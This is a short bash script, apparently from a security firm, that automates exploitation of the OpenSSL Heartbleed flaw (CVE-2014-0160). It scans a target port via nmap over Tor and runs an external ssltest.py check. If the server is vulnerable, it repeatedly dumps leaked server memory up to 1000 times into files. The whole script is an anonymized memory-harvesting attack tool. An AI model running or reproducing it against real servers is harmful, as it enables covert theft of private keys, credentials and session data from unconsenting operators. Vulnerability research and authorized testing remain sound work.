#!/bin/bash
# OpenMAGIC v0.2
#
# OpenSSL TLS heartbeat read overrun (CVE-2014-0160)
# Written by Francesco `ascii` Ongaro - 20140218
# (C) ISGroup SRL - http://www.isgroup.biz

MAX=1000;
SLEEP=1;

function ssltest() {
	IP=`resolveip $1 -s`
	if [ `torify nmap -n -PN -p $2 $IP -oG - -open 2>/dev/null | grep -c "/open/"` -eq 1 ]; then
		echo "# [Open  ] $1:$2 ($IP)"
		if [ `torify python ssltest.py $IP $2 2>/dev/null | grep -c "server is vulnerable"` -eq 1 ]; then
			echo "# [Vuln  ] $1:$2"
			for i in `seq 1 $MAX`; do
				torify python ssltest.py $IP -p $2 -o ssltest/$1_$2_$i.bin 2>/dev/null > ssltest/$1_$2_$i.out;
				echo "# [Loop  ] $1:$2 %$i";
				sleep $SLEEP;
			done
		else
			echo "# [Safe  ] $1:$2"
		fi
	else
		echo "# [Closed] $1:$2"
	fi
}

ssltest $1 $2;
